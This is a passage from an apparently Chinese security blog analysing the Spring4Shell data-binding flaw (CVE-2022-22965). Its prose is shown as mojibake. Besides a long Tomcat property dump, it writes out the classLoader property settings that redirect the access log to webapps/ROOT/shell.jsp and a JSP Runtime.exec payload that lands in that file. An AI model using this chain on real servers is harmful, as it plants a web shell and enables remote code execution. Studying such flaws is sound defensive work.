  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setCondition</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">conditionIf</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getConditionIf</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setConditionIf</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">conditionUnless</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getConditionUnless</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setConditionUnless</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">container</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Container</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getContainer</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setContainer</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Container</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">directory</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getDirectory</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setDirectory</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">domain</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">getDomain</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">setDomain</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">domainInternal</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getDomainInternal</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">enabled</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">encoding</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getEncoding</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setEncoding</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">fileDateFormat</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getFileDateFormat</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setFileDateFormat</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">ipv6Canonical</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getIpv6Canonical</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setIpv6Canonical</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">locale</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getLocale</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setLocale</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">maxDays</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">int</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getMaxDays</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setMaxDays</span><span class="o">(</span><span class="kt">int</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">maxLogMessageBufferSize</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">int</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getMaxLogMessageBufferSize</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setMaxLogMessageBufferSize</span><span class="o">(</span><span class="kt">int</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">next</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Valve</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getNext</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setNext</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Valve</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">objectName</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">ObjectName</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">getObjectName</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">objectNameKeyProperties</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getObjectNameKeyProperties</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">pattern</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getPattern</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setPattern</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">prefix</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setPrefix</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">renameOnRotate</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isRenameOnRotate</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setRenameOnRotate</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">requestAttributesEnabled</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getRequestAttributesEnabled</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setRequestAttributesEnabled</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">rotatable</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isRotatable</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setRotatable</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">state</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">LifecycleState</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">stateName</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getStateName</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">suffix</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getSuffix</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setSuffix</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">throwOnFailure</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getThrowOnFailure</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">setThrowOnFailure</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
</code></pre></div></div>

<p>ä»ç±»åå¾—çŸ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è®¿é—®æˆåŠŸçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ¥å†™å…¥jspã€‚</p>

<p>é»˜è®¤çš„é…ç½®ä¸ºï¼š</p>

<pre><code class="language-txt">class.classLoader.resources.context.parent.pipeline.first.directory =logs
class.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log
class.classLoader.resources.context.parent.pipeline.first.suffix = .txt
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd
</code></pre>

<p>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸ºï¼š</p>

<pre><code class="language-txt">class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT

class.classLoader.resources.context.parent.pipeline.first.prefix=shell

class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
</code></pre>

<p>è¿™æœ‰ç‚¹åƒphpmyadminé€šè¿‡æ—¥å¿—æ–‡ä»¶å†™é©¬çš„æ€è·¯ï¼Œä¸è¿‡æ—¥å¿—æ–‡ä»¶rceéƒ½å¤§åŒå°å¼‚ã€‚</p>

<p>è¿™æ ·éšæ„è®¿é—®<code class="language-plaintext highlighter-rouge">/?a=&lt;%Runtime.getRuntime().exec("open -a Calculator");%&gt;</code>å³å¯å†™å…¥æ¶æ„è¯­å¥ã€‚</p>

<h2 id="ä¸ºä½•éœ€è¦jdk9">ä¸ºä½•éœ€è¦JDK9ï¼Ÿ</h2>

<p>è‡³æ­¤ï¼Œå…¶å®ç­”æ¡ˆä¹Ÿç®—æ¯”è¾ƒæ˜äº†äº†ï¼ŒCVE-2010-1622åSpringé‡‡ç”¨äº†é»‘åå•é™åˆ¶äº†<code class="language-plaintext highlighter-rouge">class.classLoader</code>ï¼Œè€ŒJDK9å¼•å…¥äº†<a href="https://blog.csdn.net/charles_neil/article/details/114460702"> Module</a> æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡<code class="language-plaintext highlighter-rouge">class.module.classLoader</code>ç»•è¿‡é»‘åå•ï¼ŒCVE-2022-22965 æœ¬è´¨ä¸Šå°±æ˜¯ CVE-2010-1622ä¸Š çš„ä¸€ä¸ªç»•è¿‡ã€‚</p>

<h2 id="arrayset-çš„ä¸€ä¸ªè¯¯åŒº">Array.set çš„ä¸€ä¸ªè¯¯åŒº</h2>

<p>åœ¨ä¸å°‘çš„æ–‡ç« ä¸­ï¼Œéƒ½æœ‰è°ˆåˆ°å¦‚æœéœ€è¦setçš„å±æ€§æ˜¯arrayç±»å‹ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚</p>

<p>æˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹ä»¥ä¸‹åœºæ™¯ï¼Œç»™<code class="language-plaintext highlighter-rouge">User</code>ç±»å¤šåŠ äº†ä¸€ä¸ªageå±æ€§ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è®¾ç½®å…¶setæ–¹æ³•ã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getAge</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">...</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getAge</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">age</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>å‘é€è¯·æ±‚<code class="language-plaintext highlighter-rouge">http://localhost:8080/login5?username=theoyu&amp;age=10</code>ï¼Œç»ˆç«¯ä¸å‡ºæ„å¤–çš„æ‰“å°äº†0ã€‚</p>

<p>æˆ‘ä»¬æ”¹å†™ä¸€ä¸‹å±æ€§ï¼Œå¢æ·»ä¸€ä¸ªæ•°ç»„ç±»å‹agesï¼ŒåŒæ ·ä¸è®¾ç½®setæ–¹æ³•ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getAges</span><span class="o">()[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">...</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span><span class="o">[]</span> <span class="n">ages</span> <span class="o">=</span> <span class="o">{</span><span class="mi">0</span><span class="o">};</span>

    <span class="kd">public</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">getAges</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">ages</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>å‘é€è¯·æ±‚<code class="language-plaintext highlighter-rouge">http://localhost:8080/login5?username=theoyu&amp;ages[0]=10</code>ï¼Œ</p>

